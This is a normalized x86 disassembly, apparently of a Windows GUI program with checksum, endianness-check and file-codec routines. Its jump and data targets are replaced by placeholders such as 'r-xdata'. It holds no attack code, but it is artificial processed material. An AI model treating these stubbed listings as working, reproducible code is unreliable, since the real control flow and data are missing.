cmp ecx [ edx ]
sbb edx edx
neg edx
and eax edx
and eax 0x1
sub_4099d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rwxdata ]
xor eax esp
mov [ esp + 0x20 ] eax
xor eax eax
mov [ esp ] 0x0
push ebx
mov [ esp + 0x4 ] ax
mov [ esp + eax + 0x4 ] al
inc eax
cmp eax 0x10
jl r-xdata
xor eax eax
mov ecx 0x3020100
cmp [ esp + 0x4 ] ecx
mov edx 0x100
sete al
xor ebx ebx
cmp [ esp + 0x4 ] dx
sete bl
and eax ebx
and eax 0x1
je r-xdata
mov ecx [ esp + 0x24 ]
dec eax
neg eax
sbb eax eax
pop ebx
xor ecx esp
call sub_40b946
mov esp ebp
pop ebp
retn
xor eax eax
jmp r-xdata
mov dx [ esp + eax + 0x4 ]
mov [ esp + eax * 2 + 0x14 ] dx
inc eax
cmp eax 0x4
jl r-xdata
xor edx edx
mov eax 0x403
cmp [ esp + 0x1a ] ax
mov eax 0x302
sete dl
xor ebx ebx
cmp [ esp + 0x18 ] ax
mov eax 0x201
sete bl
and edx ebx
xor ebx ebx
cmp [ esp + 0x16 ] ax
mov eax 0x100
sete bl
and edx ebx
xor ebx ebx
cmp [ esp + 0x14 ] ax
sete bl
and edx ebx
and edx 0x1
mov eax edx
je r-xdata
xor eax eax
nop
mov edx [ esp + eax + 0x4 ]
mov [ esp + eax * 4 + 0x14 ] edx
inc eax
cmp eax 0x4
jl r-xdata
xor eax eax
cmp [ esp + 0x1c ] 0x5040302
sete al
xor edx edx
cmp [ esp + 0x18 ] 0x4030201
sete dl
and eax edx
xor edx edx
cmp [ esp + 0x20 ] 0x6050403
sete dl
and eax edx
xor edx edx
cmp [ esp + 0x14 ] ecx
sete dl
and eax edx
and eax 0x1
je r-xdata
mov eax 0xc3
mov ecx r--data
mov edx 0x1
call sub_409d60
xor ecx ecx
cmp eax 0x52ca3a75
sete cl
and ecx 0x1
mov eax ecx
je r-xdata
mov [ rwxdata ] 0xfffffffd
mov [ rwxdata ] 0xfffffffe
mov [ rwxdata ] 0xffffffff
call sub_4098e0
and eax 0x1
sub_409b40
push ebp
mov ebp esp
push ecx
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_40b946
mov esp ebp
pop ebp
retn
sub_409b90
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov [ rwxdata ] 0x1
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
or eax 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
cmp ecx 0x2
jne r-xdata
cmp edx 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp edx 0x4
jne r-xdata
cmp edi 0xffffffff
je r-xdata
cmp esi 0x4
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0xffffffff
je r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
pop ebp
jmp sub_4099d0
cmp eax 0x4
jne r-xdata
sub_409c40
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_409d60
push ebx
push esi
push edi
mov edi edx
mov esi ecx
mov ebx eax
movzx ecx di
shr edi 0x10
test ebx ebx
je r-xdata
mov eax edi
pop edi
shl eax 0x10
pop esi
or eax ecx
pop ebx
retn
jmp r-xdata
mov eax ebx
cmp ebx 0x15b0
jb r-xdata
sub ebx eax
cmp eax 0x10
jl r-xdata
mov eax 0x15b0
test eax eax
je r-xdata
lea ebx [ ebx ]
mov eax 0x80078071
mul ecx
shr edx 0xf
imul edx edx 0xffff000f
add ecx edx
mov eax 0x80078071
mul edi
shr edx 0xf
imul edx edx 0xffff000f
add edi edx
test ebx ebx
jne r-xdata
movzx edx [ esi ]
add ecx edx
dec eax
inc esi
add edi ecx
test eax eax
jg r-xdata
movzx edx [ esi ]
add ecx edx
movzx edx [ esi + 0x1 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x2 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x3 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x4 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x5 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x6 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x7 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x8 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x9 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xa ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xb ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xc ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xd ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xe ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xf ]
add edi ecx
add ecx edx
sub eax 0x10
add edi ecx
add esi 0x10
cmp eax 0x10
jge r-xdata
sub_409e80
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x5
push 0x4
push 0x4
push 0x4
push 0x4
push 0x2
push 0x10300
or ebx 0xffffffff
mov edi 0x4
mov esi 0x4
mov edx 0x4
call sub_409b90
add esp 0x18
test eax eax
je r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x1c ] 0x7a120
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ rwxdata ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x14 ] rwxdata
mov eax [ ebp - 0x10 ]
add eax rwxdata
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_402440
add esp 0x10
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x10 ]
mov [ rwxdata ] edx
mov eax [ ebp - 0x10 ]
mov [ rwxdata ] eax
mov esp [ rwxdata ]
mov ebp [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
mov esi [ rwxdata ]
mov edi [ rwxdata ]
lea eax [ rwxdata ]
jmp eax
lea ecx [ ebp - 0x10 ]
push ecx
push rwxdata
push 0x244
push rwxdata
call sub_402440
add esp 0x10
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
sub_409f80
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push eax
lea eax [ rwxdata ]
mov [ eax ] esp
add [ eax ] 0x4
lea eax [ rwxdata ]
mov [ eax ] ecx
lea eax [ rwxdata ]
mov [ eax ] edx
lea eax [ rwxdata ]
mov [ eax ] ebp
lea esi [ rwxdata ]
mov [ eax ] esi
lea edi [ rwxdata ]
mov [ eax ] edi
mov esi [ ebp + 0x8 ]
mov edi [ LoadStringA@IAT ]
push 0x64
push rwxdata
push 0x67
push esi
call edi
push 0x64
push rwxdata
push 0x6d
push esi
call edi
mov eax esi
call sub_40a060
mov [ rwxdata ] esi
call sub_409e80
push 0x6d
push esi
call [ LoadAcceleratorsA@IAT ]
mov edi [ GetMessageA@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ TranslateAcceleratorA@IAT ]
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea ecx [ ebp - 0x1c ]
push ecx
call [ DispatchMessageA@IAT ]
mov edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push esi
push edx
call ebx
test eax eax
jne r-xdata
sub_40a060
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi [ LoadIconA@IAT ]
push 0x6b
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_40a0f0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] eax
call esi
push 0x7f00
push 0x0
mov [ ebp - 0x18 ] eax
call [ LoadCursorA@IAT ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x1c ]
push 0x6c
push eax
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rwxdata
call esi
lea ecx [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x4 ] eax
call [ RegisterClassExA@IAT ]
pop esi
mov esp ebp
pop ebp
retn
sub_40a0f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rwxdata ]
xor eax esp
mov [ esp + 0x48 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sub eax 0x2
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
mov ecx [ esp + 0x4c ]
pop esi
xor ecx esp
xor eax eax
call sub_40b946
mov esp ebp
pop ebp
retn 0x10
sub eax 0xd
je r-xdata
lea edx [ esp + 0x8 ]
push edx
push esi
call [ BeginPaint@IAT ]
lea eax [ esp + 0x8 ]
push eax
push esi
call [ EndPaint@IAT ]
xor eax eax
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40b946
mov esp ebp
pop ebp
retn 0x10
sub eax 0x102
je r-xdata
mov ecx [ ebp + 0x10 ]
movzx eax cx
sub eax 0x68
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
push edx
push ecx
push esi
call [ DefWindowProcA@IAT ]
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40b946
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rwxdata ]
push 0x0
push sub_40a210
push esi
push 0x67
push ecx
call [ DialogBoxParamA@IAT ]
xor eax eax
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40b946
mov esp ebp
pop ebp
retn 0x10
dec eax
je r-xdata
push esi
call [ DestroyWindow@IAT ]
xor eax eax
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40b946
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
push eax
push ecx
push 0x111
push esi
call [ DefWindowProcA@IAT ]
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40b946
mov esp ebp
pop ebp
retn 0x10
sub_40a210
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
dec eax
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
cmp ax 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax ax
push eax
push ecx
call [ EndDialog@IAT ]
cmp ax 0x2
je r-xdata
sub_40a250
push ebp
mov ebp esp
push eax
push esi
push 0x1
push ecx
call sub_40c622
add esp 0x10
cmp eax esi
jbe r-xdata
je r-xdata
push r--data
add [ rwxdata ] eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push r--data
jmp r-xdata
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x8
push 0x1
call sub_40ce63
sub_40a2a0
push ebp
mov ebp esp
test eax eax
je r-xdata
add [ rwxdata ] esi
mov eax esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x1
push eax
call sub_40c994
add esp 0x10
cmp eax esi
je r-xdata
push eax
push esi
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x10
push 0x1
call sub_40ce63
sub_40a2f0
push ebp
mov ebp esp
push ecx
push eax
push 0x1
lea ecx [ ebp - 0x1 ]
push 0x1
push ecx
call sub_40c622
add esp 0x10
cmp eax 0x1
jbe r-xdata
je r-xdata
push r--data
inc [ rwxdata ]
movzx eax [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
push r--data
jmp r-xdata
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x8
push 0x1
call sub_40ce63
sub_40a340
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
mov [ ebp + 0xb ] cl
test eax eax
je r-xdata
inc [ rwxdata ]
pop ebp
retn
push eax
push 0x1
lea edx [ ebp + 0xb ]
push 0x1
push edx
call sub_40c994
add esp 0x10
cmp eax 0x1
je r-xdata
push eax
push 0x1
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x10
push 0x1
call sub_40ce63
sub_40a390
push ebp
mov ebp esp
push ecx
push eax
push 0x4
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
call sub_40c622
add esp 0x10
cmp eax 0x4
jbe r-xdata
je r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add [ rwxdata ] 0x4
movzx eax cl
shl eax 0x8
movzx edx ch
movzx ecx [ ebp - 0x2 ]
or eax edx
movzx edx [ ebp - 0x1 ]
shl eax 0x8
or eax ecx
shl eax 0x8
or eax edx
mov esp ebp
pop ebp
retn
push r--data
jmp r-xdata
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x8
push 0x1
call sub_40ce63
sub_40a400
push ebp
mov ebp esp
push ecx
mov edx eax
shr edx 0x8
mov [ ebp - 0x2 ] dl
mov edx eax
mov [ ebp - 0x1 ] al
shr edx 0x10
shr eax 0x18
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x4 ] al
test ecx ecx
je r-xdata
add [ rwxdata ] 0x4
mov esp ebp
pop ebp
retn
push ecx
push 0x4
lea eax [ ebp - 0x4 ]
push 0x1
push eax
call sub_40c994
add esp 0x10
cmp eax 0x4
je r-xdata
push eax
push 0x4
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x10
push 0x1
call sub_40ce63
sub_40a470
push ebp
mov ebp esp
cmp eax 0x2b
je r-xdata
mov eax [ ebp + 0x8 ]
shr eax 0x3
add eax 0x100
pop ebp
retn
cmp eax 0x2d
je r-xdata
cmp eax 0x2e
je r-xdata
xor eax eax
pop ebp
retn
sub_40a4a0
lea edx [ eax - 0x1 ]
mov [ rwxdata ] 0x0
cmp edx 0x9
ja r-xdata
xor eax eax
retn
cmp ecx 0x2b
jne r-xdata
cmp ecx 0x2d
jne r-xdata
push eax
push r--data
jmp r-xdata
cmp ecx 0x2e
jne r-xdata
push eax
push r--data
jmp r-xdata
push rwxdata
call sub_40bdd1
add esp 0xc
mov eax 0x1
retn
push eax
push r--data
sub_40a4f0
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
xor ebx ebx
push edi
xor edi edi
cmp [ rwxdata ] edi
mov esi eax
sete bl
mov [ rwxdata ] edi
mov [ rwxdata ] edi
mov [ ebp - 0x20 ] ebx
cmp esi edi
je r-xdata
add [ rwxdata ] 0x8
mov eax ebx
mov ecx ebx
mov [ ebp - 0x5 ] bl
shr eax 0x8
shr ecx 0x10
shr ebx 0x18
mov [ ebp - 0x6 ] al
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x8 ] bl
cmp esi edi
je r-xdata
push esi
push 0x8
push 0x1
push r--data
call sub_40c994
add esp 0x10
cmp eax 0x8
je r-xdata
add [ rwxdata ] 0x4
mov al [ ebp + 0xc ]
mov [ ebp - 0x1 ] al
cmp esi edi
je r-xdata
push esi
push 0x4
lea edx [ ebp - 0x8 ]
push 0x1
push edx
call sub_40c994
add esp 0x10
cmp eax 0x4
je r-xdata
push eax
push 0x8
mov dl [ ebp + 0x10 ]
mov ebx 0x1
add [ rwxdata ] ebx
mov [ ebp - 0x2 ] dl
cmp esi edi
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x1 ]
push 0x1
push ecx
call sub_40c994
add esp 0x10
cmp eax 0x1
je r-xdata
push eax
push 0x4
jmp r-xdata
add [ rwxdata ] ebx
mov ebx [ ebp + 0x14 ]
mov ecx ebx
mov edx ebx
mov eax ebx
shr ecx 0x8
shr edx 0x10
shr eax 0x18
mov [ ebp - 0xd ] bl
mov [ ebp - 0xe ] cl
mov [ ebp - 0xf ] dl
mov [ ebp - 0x10 ] al
cmp esi edi
je r-xdata
push esi
push ebx
lea eax [ ebp - 0x2 ]
push ebx
push eax
call sub_40c994
add esp 0x10
cmp eax ebx
je r-xdata
push eax
push 0x1
jmp r-xdata
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x10
mov eax [ ebp + 0xc ]
add [ rwxdata ] 0x4
mov [ ebp - 0x1c ] 0x1
cmp eax 0x2b
je r-xdata
push esi
push 0x4
lea ecx [ ebp - 0x10 ]
push 0x1
push ecx
call sub_40c994
add esp 0x10
cmp eax 0x4
je r-xdata
push eax
push ebx
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x10
push ebx
jmp r-xdata
mov edi ebx
shr edi 0x3
add edi 0x100
cmp eax 0x2d
je r-xdata
push eax
push 0x4
jmp r-xdata
call sub_40ce63
mov eax [ rwxdata ]
push eax
push r--data
test eax eax
je r-xdata
cmp eax 0x2e
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
push ebx
push 0x1
push edi
call sub_40c622
mov ebx eax
add esp 0x10
cmp ebx [ ebp + 0x14 ]
ja r-xdata
push ebx
call sub_40b9ce
add edi ebx
push edi
mov [ ebp - 0x18 ] eax
call sub_40b9ce
mov edi [ ebp - 0x18 ]
add esp 0x8
mov [ ebp - 0xc ] eax
test edi edi
je r-xdata
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x8
jmp r-xdata
lea esp [ esp ]
push 0x1
xor eax eax
mov ecx esi
call sub_40a400
test [ ebp - 0x20 ] 0x1
je r-xdata
test [ ebp - 0x20 ] 0x1
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx esi
call sub_40a400
call sub_40c7d5
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
or eax 0xffffffff
fdiv [ r--data ]
mov [ ebp - 0x8 ] 0x0
fstp [ ebp - 0x2c ]
cmp ecx 0x2b
jne r-xdata
mov edx [ ebp - 0x1c ]
mov eax ebx
mov ecx edi
call sub_409d60
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_40b955
push edi
call sub_40b955
add esp 0x8
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x2d
jne r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edx
mov edx ebx
mov ecx edi
call sub_401ef0
jmp r-xdata
cmp ecx 0x2e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edx
mov edx ebx
mov ecx edi
call sub_4049a0
jmp r-xdata
add esp 0xc
cmp eax 0xfffffffd
je r-xdata
push eax
push r--data
call sub_40c13f
mov esi 0x2
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edx
mov edx ebx
mov ecx edi
call sub_4076c0
mov edx [ rwxdata ]
push edx
push r--data
jmp r-xdata
test eax eax
jne r-xdata
add esp 0x8
call sub_40c13f
mov esi 0x1
mov ecx [ ebp + 0xc ]
cmp ecx 0x2b
je r-xdata
mov ecx ebx
shr ecx 0x3
add ecx 0x100
cmp ecx 0x2d
je r-xdata
call sub_40c7d5
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
mov edx ebx
mov [ ebp - 0x30 ] edx
fdiv [ r--data ]
fild [ ebp - 0x30 ]
test edx edx
jns r-xdata
cmp ecx 0x2e
je r-xdata
fadd [ rwxdata ]
mov eax ebx
shr eax 0x8
mov ecx ebx
fstp [ rwxdata ]
shr ecx 0x10
mov edx ebx
fsub [ ebp - 0x2c ]
shr edx 0x18
mov [ ebp - 0xd ] bl
mov [ ebp - 0x24 ] eax
fadd [ rwxdata ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0xf ] cl
fstp [ rwxdata ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x10 ] dl
test esi esi
je r-xdata
fadd [ r--data ]
xor ecx ecx
jmp r-xdata
add [ rwxdata ] 0x4
cmp [ ebp - 0x8 ] ebx
jae r-xdata
push esi
push 0x4
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c994
add esp 0x10
cmp eax 0x4
jne r-xdata
add ecx ebx
cmp [ ebp - 0x8 ] ecx
ja r-xdata
mov [ ebp - 0x17 ] cl
mov cl [ ebp - 0x30 ]
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x16 ] al
mov [ ebp - 0x18 ] cl
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx eax
shr ecx 0x8
mov [ ebp - 0x12 ] cl
mov edx eax
mov ecx eax
shr edx 0x10
shr ecx 0x18
mov [ ebp - 0x11 ] al
mov [ ebp - 0x13 ] dl
mov [ ebp - 0x14 ] cl
test esi esi
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x28 ]
add [ rwxdata ] 0x4
test esi esi
je r-xdata
push esi
push 0x4
lea edx [ ebp - 0x18 ]
push 0x1
push edx
call sub_40c994
add esp 0x10
cmp eax 0x4
jne r-xdata
add [ rwxdata ] 0x4
test esi esi
je r-xdata
push esi
push 0x4
lea edx [ ebp - 0x14 ]
push 0x1
push edx
call sub_40c994
add esp 0x10
cmp eax 0x4
jne r-xdata
add [ rwxdata ] ebx
push esi
push ebx
push 0x1
push edi
call sub_40c994
add esp 0x10
cmp eax ebx
jne r-xdata
add [ rwxdata ] eax
jmp r-xdata
push esi
push eax
mov eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c994
mov ecx [ ebp - 0x8 ]
add esp 0x10
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x8 ]
add [ rwxdata ] ebx
test ebx ebx
je r-xdata
push eax
push ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
push eax
push ecx
push 0x1
push edi
call sub_40c622
mov ebx eax
add esp 0x10
cmp ebx [ ebp + 0x14 ]
jbe r-xdata
push eax
push ecx
jmp r-xdata
mov eax ecx
sub_40a9b0
push ebp
mov ebp esp
sub esp 0xc
call sub_40c7d5
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fdiv [ r--data ]
fstp [ ebp - 0xc ]
jbe r-xdata
call sub_40c7d5
mov [ ebp + 0x8 ] eax
fild [ ebp + 0x8 ]
fdiv [ r--data ]
fsub [ ebp - 0xc ]
fadd [ rwxdata ]
fstp [ rwxdata ]
mov esp ebp
pop ebp
retn
fld [ rwxdata ]
cmp ebx 0x2d
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edi
push edx
call sub_402440
jmp r-xdata
cmp ebx 0x2e
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edi
push edx
call sub_404ef0
jmp r-xdata
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
fstp st0
mov edx [ rwxdata ]
push ecx
push esi
push edi
push ebx
push eax
push edx
push r--data
call sub_40c13f
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
add esp 0x24
push 0x1
call sub_40ce63
int3
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edi
push edx
call sub_407c10
cmp [ ebp - 0x4 ] esi
jne r-xdata
mov eax esi
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
test eax eax
jns r-xdata
cmp [ ebp + 0x8 ] 0x0
faddp st1
fst [ rwxdata ]
ja r-xdata
fadd [ r--data ]
dec [ ebp + 0x8 ]
or eax 0xffffffff
mov [ ebp - 0x4 ] esi
cmp ebx 0x2b
jne r-xdata
fstp st0
sub_40aac0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
push edi
push 0x8
xor esi esi
lea ecx [ ebp - 0xc ]
push 0x1
push ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
call sub_40c622
add esp 0x10
cmp eax 0x8
jbe r-xdata
add [ rwxdata ] eax
cmp eax 0x8
jne r-xdata
push r--data
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
mov esi 0x1
xor ecx ecx
jmp r-xdata
mov edx [ ebp + ecx - 0xc ]
cmp edx [ ecx + r--data ]
jne r-xdata
sub eax 0x4
add ecx 0x4
cmp eax 0x4
jae r-xdata
push edi
mov esi 0x4
push esi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_40c622
add esp 0x10
cmp eax esi
ja r-xdata
je r-xdata
mov ecx [ ebp - 0x14 ]
movzx edx [ ebp - 0x12 ]
add [ rwxdata ] esi
movzx eax cl
shl eax 0x8
movzx ecx ch
or eax ecx
movzx ecx [ ebp - 0x11 ]
shl eax 0x8
or eax edx
push edi
push 0x1
shl eax 0x8
lea edx [ ebp - 0xd ]
or eax ecx
push 0x1
push edx
mov [ ebp - 0x30 ] eax
call sub_40c622
add esp 0x10
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
je r-xdata
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x8
inc [ rwxdata ]
movzx ebx [ ebp - 0xd ]
push edi
push 0x1
lea eax [ ebp - 0xe ]
push 0x1
push eax
call sub_40c622
add esp 0x10
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
je r-xdata
inc [ rwxdata ]
push edi
push esi
lea ecx [ ebp - 0x28 ]
push 0x1
push ecx
call sub_40c622
add esp 0x10
cmp eax esi
ja r-xdata
push r--data
jmp r-xdata
je r-xdata
add [ rwxdata ] esi
mov eax [ ebp - 0x28 ]
movzx ecx [ ebp - 0x25 ]
movzx esi al
shl esi 0x8
movzx edx ah
movzx eax [ ebp - 0x26 ]
or esi edx
shl esi 0x8
or esi eax
shl esi 0x8
or esi ecx
mov [ ebp - 0x38 ] esi
cmp ebx 0x2b
je r-xdata
push r--data
jmp r-xdata
mov eax esi
shr eax 0x3
add eax 0x100
mov [ ebp - 0x24 ] eax
je r-xdata
cmp ebx 0x2d
je r-xdata
movzx eax [ ebp - 0xe ]
mov edx [ rwxdata ]
push eax
push ebx
push edx
push r--data
call sub_40c13f
add esp 0x10
mov esi 0x2
jmp r-xdata
movzx eax [ ebp - 0xe ]
lea edx [ eax - 0x1 ]
mov [ rwxdata ] 0x0
cmp edx 0x9
ja r-xdata
cmp ebx 0x2e
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_40b955
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
mov esp ebp
pop ebp
retn
cmp ebx 0x2b
jne r-xdata
cmp ebx 0x2d
jne r-xdata
push eax
push r--data
jmp r-xdata
cmp ebx 0x2e
jne r-xdata
push eax
push r--data
jmp r-xdata
push rwxdata
call sub_40bdd1
mov ecx [ rwxdata ]
add esp 0xc
lea eax [ esi - 0x400 ]
push esi
push ecx
cmp eax 0x7ffc00
ja r-xdata
push eax
push r--data
push r--data
call sub_40c13f
add esp 0xc
mov esi 0x3
jmp r-xdata
push r--data
call sub_40c13f
mov edx [ ebp - 0x24 ]
add esp 0xc
cmp [ ebp + 0xc ] 0x0
lea eax [ esi + edx ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x24 ] eax
jbe r-xdata
push eax
call sub_40b9ce
mov ebx eax
add esp 0x4
mov [ ebp - 0x2c ] ebx
test ebx ebx
jne r-xdata
add eax esi
mov [ ebp - 0x24 ] eax
